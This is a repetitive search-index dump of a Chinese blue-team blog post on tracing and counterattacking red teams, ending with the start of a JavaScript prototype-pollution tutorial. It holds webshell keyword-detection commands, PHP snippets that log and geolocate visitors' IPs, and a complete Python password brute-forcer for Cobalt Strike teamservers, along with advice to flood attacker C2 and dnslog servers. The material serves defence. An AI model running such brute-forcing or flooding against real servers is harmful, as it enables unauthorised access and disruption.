'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#手工查杀"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#webshell反打"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#获取照片"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#获取攻击者访问的时间ip"},{"categories":["hvv"],"content":"\rwebshell溯源反制：\rwebshell查杀：\r工具查杀：1、d盾： http://www.d99net.net/ 3、网站安全狗： https://www.safedog.cn/website_safedog.html 3、百度webshell查杀引擎： https://scanner.baidu.com/#/pages/intro 手工查杀：由于某些变种webshell查杀工具很难发现，所以有些时候需要手工从其他维度去查杀，比如修改时间，日志，备份对比等。 1.上传目录关键字查找 上传目录是最有可能存在websehll的，一般来说要优先排查上传目录 脚本代码排查： grep -rn php upload/ 关键字排查： 排查eval、system、assert、phpspy、c99sh、milw0rm、gunerpress、shell_exec、passthru、bash等关键字 find /www/upload -name \"*.php\" |xargs egrep 'assert|bash|system|phpspy|c99sh|milw0rm|eval|\\(gunerpress|\\(base64_decoolcode|spider_bc|shell_exec|passthru|\\(\\$\\_\\POST\\[|eval\\(|file_put_contents|base64_decode' 2.web非上传目录排查增删改查 如果上传目录没有发现webshell，那么有可能攻击者使用了除web上传接口的其他途径写入了文件，如命令执行等，此时需要排查web目录的非上传路径。 备份对比 对比非上传目录前后文件变动，寻找可疑文件，再进一步关键字匹配分析 vimdiff \u003c(cd /tmp/1.1; find . | sort) \u003c(cd /tmp/1.2; find . | sort) 3.时间戳排查 根据情况调取短期内改动文件进行分析 find / -mtime -10 -mtime +1 2\u003e/dev/null #一天前，十天内变动的文件 4.文件名排查 使用tree命令列举整个web目录文件，然后排查可疑文件 tree /var/www/ 5.日志排查 cat /var/log/apache2/access.log | grep \"antSword\" webshell反打：webshell嵌入js代码，获取红队定位信息甚至是拍照、获取IP地址甚至是经纬度信息 （只适用于有文件落地的，不适用于内存马，同时获取到的IP地址、经纬度信息的准确性也有待商榷，因为这一切的前提是攻击者直接用自己的网路远程操作webshell才行，否则我们获取的IP地址一样是跳板机的） 获取照片： Take Photo 获取攻击者访问的时间、ip： \u003c?php $ip = $_SERVER['REMOTE_ADDR']; echo \"Your IP address is: $ip\"; $ip=get_real_ip(); $dat=date('Y-m-d H:i:s',time()); $a=$dat.' '.'文件名称:'.' IP:'.$ip.\"\\n\"; $myfile=fopen(\"testfile.txt\", \"a+\"); fwrite($myfile, $a); fclose($myfile); function get_real_ip() { $ip=FALSE; //客户端IP 或 NONE if(!empty($_SERVER[\"HTTP_CLIENT_IP\"])){ $ip = $_SERVER[\"HTTP_CLIENT_IP\"]; } //多重代理服务器下的客户端真实IP地址（可能伪造）,如果没有使用代理，此字段为空 if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { $ips = explode (\", \", $_SERVER['HTTP_X_FORWARDED_FOR']); if ($ip) { array_unshift($ips, $ip); $ip = FALSE; } for ($i = 0; $i \u003c count($ips); $i++) { if (!eregi (\"^(10│172.16│192.168).\", $ips[$i])) { $ip = $ips[$i]; break; } } } //客户端IP 或 (最后一个)代理服务器 IP return ($ip ? $ip : $_SERVER['REMOTE_ADDR']); } ?\u003e 获取攻击者访问时间、ip后会在本地生成日志文件 获取经纬度： \u003c?php echo $_SERVER['HTTP_HOST']; $getIp=$_SERVER[\"REMOTE_ADDR\"]; echo 'IP:',$getIp; echo ''; $content = file_get_contents(\"http://api.map.baidu.com/location/ip?ak=自己去申请一个\u0026ip={$getIp}\u0026coor=bd09ll\"); $json = json_decode($content); echo 'log:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'x'};//按层级关系提取经度数据 echo ''; echo 'lat:',$json-\u003e{'content'}-\u003e{'point'}-\u003e{'y'};//按层级关系提取纬度数据 echo ''; print $json-\u003e{'content'}-\u003e{'address'};//按层级关系提取address数 echo $json-\u003e{'content'}-\u003e{'address_detail'}-\u003e{'city_code'}; print_r($json); ?\u003e 样本逆向分析： 大多数样本总会有返连行为，少数会进行命令连接，可能找到对方的CC服务器 钓鱼邮件分析： PDF信息获取等 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:7:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#获取经纬度"},{"categories":["hvv"],"content":"\rCobalt Strike反制在防守里面,必不可少的是钓鱼邮件,或者社工钓鱼,一般来说钓鱼的样本无非这几种,exe elf可执行文件,以及加了料的doc类宏木马,一般而言,目前红队主要是通过cobalt strike生成相关上线的shell 批量上线钓鱼马,启几百个进程mddos红方的cs端.假如我们获取到了红方的cs样本,那么第一种方法可以批量启几百个进程运行该样本(注意隔离环境),然后红方的cs端几乎瘫痪,无法使用 爆破cs密码 一般而言,红队的cs设施为了多人运动,密码通常不会太复杂,很大机会是弱口令为主,甚至teamserver端口50050,那么针对cs端控制端,可以直接进行密码爆破 假上线,我们只需要发送心跳包,即可模拟上线,并且攻击者无法执行命令.使用时更改换IP或域名、port、cookie 附CS爆破密码脚本 #!/usr/bin/env python3 import time import socket import ssl import argparse import concurrent.futures import sys # csbrute.py - Cobalt Strike Team Server Password Brute Forcer # https://stackoverflow.com/questions/6224736/how-to-write-python-code-that-is-able-to-properly-require-a-minimal-python-versi MIN_PYTHON = (3, 3) if sys.version_info \u003c MIN_PYTHON: sys.exit(\"Python %s.%s or later is required.\\n\" % MIN_PYTHON) parser = argparse.ArgumentParser() parser.add_argument(\"host\", help=\"Teamserver address\") parser.add_argument(\"wordlist\", nargs=\"?\", help=\"Newline-delimited word list file\") parser.add_argument(\"-p\", dest=\"port\", default=50050, type=int, help=\"Teamserver port\") parser.add_argument(\"-t\", dest=\"threads\", default=25, type=int, help=\"Concurrency level\") args = parser.parse_args() # https://stackoverflow.com/questions/27679890/how-to-handle-ssl-connections-in-raw-python-socket class NotConnectedException(Exception): def __init__(self, message=None, node=None): self.message = message self.node = node class DisconnectedException(Exception): def __init__(self, message=None, node=None): self.message = message self.node = node class Connector: def __init__(self): self.sock = None self.ssl_sock = None self.ctx = ssl.SSLContext() self.ctx.verify_mode = ssl.CERT_NONE pass def is_connected(self): return self.sock and self.ssl_sock def open(self, hostname, port): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(10) self.ssl_sock = self.ctx.wrap_socket(self.sock) if hostname == socket.gethostname(): ipaddress = socket.gethostbyname_ex(hostname)[2][0] self.ssl_sock.connect((ipaddress, port)) else: self.ssl_sock.connect((hostname, port)) def close(self): if self.sock: self.sock.close() self.sock = None self.ssl_sock = None def send(self, buffer): if not self.ssl_sock: raise NotConnectedException(\"Not connected (SSL Socket is null)\") self.ssl_sock.sendall(buffer) def receive(self): if not self.ssl_sock: raise NotConnectedException(\"Not connected (SSL Socket is null)\") received_size = 0 data_buffer = b\"\" while received_size \u003c 4: data_in = self.ssl_sock.recv() data_buffer = data_buffer + data_in received_size += len(data_in) return data_buffer def passwordcheck(password): if len(password) \u003e 0: result = None conn = Connector() conn.open(args.host, args.port) payload = bytearray(b\"\\x00\\x00\\xbe\\xef\") + len(password).to_bytes(1, \"big\", signed=True) + bytes( bytes(password, \"ascii\").ljust(256, b\"A\")) conn.send(payload) if conn.is_connected(): result = conn.receive() if conn.is_connected(): conn.close() if result == bytearray(b\"\\x00\\x00\\xca\\xfe\"): return password else: return False else: print(\"Ignored blank password\") passwords = [] if args.wordlist: print(\"Wordlist: {}\".format(args.wordlist)) passwords = open(args.wordlist).read().split(\"\\n\") else: print(\"Wordlist: {}\".format(\"stdin\")) for line in sys.stdin: passwords.append(line.rstrip()) if len(passwords) \u003e 0: print(\"Word Count: {}\".format(len(passwords))) print(\"Threads: {}\".format(args.threads)) start = time.time() # https://stackoverflow.com/questions/2846653/how-to-use-threading-in-python attempts = 0 failures = 0 with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as executor: future_to_check = {executor.submit(passwordcheck, password): password for password in passwords} for future in concurrent.futures.as_completed(future_to_check): password = future_to_check[future] try: data = future.result() attempts = attempts + 1 if data: print(\"Found Password: {}\".format(password)) except Exception as exc: failures = failures + 1 print('%r generated an exception: %s' % (password,","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:8:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#cobalt-strike反制"},{"categories":["hvv"],"content":"\r针对dnslog的反制通过流量设备审计到他人的dnslog平台的url payload,那么针对他的url payload可以进行反制.一般而言,常见的dnslog平台,蓝队防守的时候可以对厂家爱你的dnslog平台进行屏蔽.那么针对自行搭建的dnslog平台有以下思路 dnslog反制,可以批量ping捕获到的dnslog,然后而已扰乱他自行搭建的,恶意制造各种垃圾dnslog数据,让他无法获取到有效的信息,直接让红队人员被迫抛弃一个红队基础设施.具体可以写一个脚本比如站长之家之类的进行批量平,进行探测存活 httplog反制同理,可以使用爬虫节点,批量进行request请求捕获的http url即可,这样红队的dnslog平台几乎彻底报废. ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:9:0","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#针对dnslog的反制"},{"categories":["hvv"],"content":"\r攻击者画像：\r","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:9:1","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#攻击者画像"},{"categories":["hvv"],"content":"\r常见红队被反杀的姿势 使用个人工作pc,且浏览器里面保存了百度 163 sina等登录凭据,攻击对抗过程中踩到蓝队的蜜罐,被jsonp劫持漏洞捕获安全社交id,从而被溯源到了真实的姓名和所在公司 可能是蓝队封禁ip太厉害的原因,红队个人或者团队,使用自己的网站进行vps进行扫描,vps上含有团伙组织https证书,或者vps ip绑定的域名跟安全社交id对应,从而被溯源到真实姓名和所在的公司 部分攻击队写的扫描器payload里面含有攻击者的信息,如使用了私有的dnslog 攻击载荷里面含有安全社交id 含有个人博客资源请求等 投递的钓鱼邮件里面的木马样本被蓝队采集,逆向 反控c2c 溯源到个人信息 虚拟机逃逸打到实体机,暴露个人全部真实信息的 以下是狼蛛安全实验室的几篇溯源研究： 溯源专题 |通过PDF文件信息进行攻击溯源 溯源专题 | 通过时间与时区溯源 溯源专题 | 通过lnk样本进行攻击溯源 溯源专题 | 通过压缩文件溯源攻击者信息 溯源专题 | 通过分析样本组合进行溯源 溯源专题 | 通过PE中的“富签名”进行攻击溯源 【参考资料】： 网盾网络安全培训《webshell溯源排查与反制》 CSDN-vlan911《浅谈溯源反制与防溯源》 奇安信攻防社区-《【hvv2022】溯源反制案例学习笔记》 红队基础建设:隐藏你的C2 server - 先知社区 (aliyun.com) https://xz.aliyun.com/t/8385 https://www.secrss.com/articles/27611 防守反制–爆破CS Teamserver 密码 ","date":"2023-11-17","objectID":"/hvv_traceabilitycountermeasures/:9:2","series":null,"tags":["hvv"],"title":"hvv_蓝队溯源反制","uri":"/hvv_traceabilitycountermeasures/#常见红队被反杀的姿势"},{"categories":["notes"],"content":"一些JavaScript 原型链污染基础 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:0:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#"},{"categories":["notes"],"content":"\r前置基础知识原型链污染攻击也称JavaScript Prototype 污染攻击 Javascript JavaScript（简称“JS”） 是一种具有函数优先的轻量级，解释型或即时编译型的编程语言。虽然它是作为开发Web页面的脚本语言而出名，但是它也被用到了很多非浏览器环境中，JavaScript 基于原型编程、多范式的动态脚本语言，并且支持面向对象、命令式、声明式、函数式编程范式 —JavaScript 百度百科 NodeJS Node.js发布于2009年5月，由Ryan Dahl开发，是一个基于Chrome V8引擎的JavaScript运行环境，使用了一个事件驱动、非阻塞式I/O模型， 让JavaScript 运行在服务端的开发平台，它让JavaScript成为与PHP、Python、Perl、Ruby等服务端语言平起平坐的脚本语言。 —NodeJS 百度百科 ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:0","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#前置基础知识"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#javascript数据类型"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#let和var关键字的区别"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#普通变量"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#数组变量"},{"categories":["notes"],"content":"\rJavaScript数据类型\rlet和var关键字的区别使用var或let关键字可以定义变量 let和var的区别如下： var是全局作用域，let 只在当前代码块内有效 当在代码块外访问let声明的变量时会报错 var有变量提升，let没有变量提升 let必须先声明再使用，否则报Uncaught ReferenceError xxx is not defined var可以在声明前访问，只是会报undefined let变量不能重复声明，var变量可以重复声明 普通变量 var x=5; var y=6; var z=x+y; var x,y,z=1; let x=5; 数组变量 var a = new Array(); var a = []; 字典 var a = {}; var a = {\"foo\":\"bar\"}; ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:1","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#字典"},{"categories":["notes"],"content":"\rJavaScript函数在Javascript中，函数使用function关键字来进行声明 function myFunction(){ } //声明一个函数 function myFuntion(a) { } //声明一个带参数的函数 function myFuntion(a) { return a; } //声明一个带返回值的函数 匿名函数 (function(a){ console.log(a); })(123); //直接调用匿名函数 调用fn()即调用了匿名函数的功能，把变量变成函数 var fn = function(){ return \"将匿名函数赋值给变量\"； } 闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域就会被删除，此时这个新建变量也会被删除。 闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量。 例如，不适用额外的全局变量来实现一个计数器 因为add变量指定了函数自我调用的返回值，每次调用值都加1而不是每次都是1 var add=(function(){ var counter = 0; return function () {return counter +=1;} }) ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:2","series":null,"tags":["notes"],"title":"JavaScript 原型链污染","uri":"/javascript_prototype_pollution/#javascript函数"},{"categories":["notes"],"content":"\rJavaScript函数在Javascript中，函数使用function关键字来进行声明 function myFunction(){ } //声明一个函数 function myFuntion(a) { } //声明一个带参数的函数 function myFuntion(a) { return a; } //声明一个带返回值的函数 匿名函数 (function(a){ console.log(a); })(123); //直接调用匿名函数 调用fn()即调用了匿名函数的功能，把变量变成函数 var fn = function(){ return \"将匿名函数赋值给变量\"； } 闭包假设在函数内部新建了一个变量，函数执行完毕之后，函数内部这个独立作用域就会被删除，此时这个新建变量也会被删除。 闭包后，内部函数可以访问外部函数作用域的变量，而外部的函数不能直接获取到内部函数的作用域变量。 例如，不适用额外的全局变量来实现一个计数器 因为add变量指定了函数自我调用的返回值，每次调用值都加1而不是每次都是1 var add=(function(){ var counter = 0; return function () {return counter +=1;} }) ","date":"2023-11-17","objectID":"/javascript_prototype_pollution/:1:2","series":null,"tags":["notes"],"title":"JavaScript 